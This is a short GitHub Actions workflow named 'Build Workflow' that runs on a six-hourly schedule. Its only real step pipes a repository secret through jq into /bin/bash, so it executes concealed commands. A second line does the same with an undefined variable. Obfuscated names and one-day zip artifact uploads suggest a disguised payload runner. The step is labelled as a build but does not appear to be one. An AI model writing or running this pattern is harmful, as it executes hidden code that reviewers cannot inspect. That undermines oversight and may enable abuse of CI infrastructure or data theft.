name: Build Workflow
on:
  workflow_dispatch:

  schedule:
    - cron: '40 3,9,15,21 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          sq658: ${{ secrets.sq658 }}
        run: |
          printf '%s' "$sq658" | jq -r .idx97 | /bin/bash
          echo $rt9683 | jq -r .zp97676 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: WkOp8lU8
          path: "*.zip"
          retention-days: 1
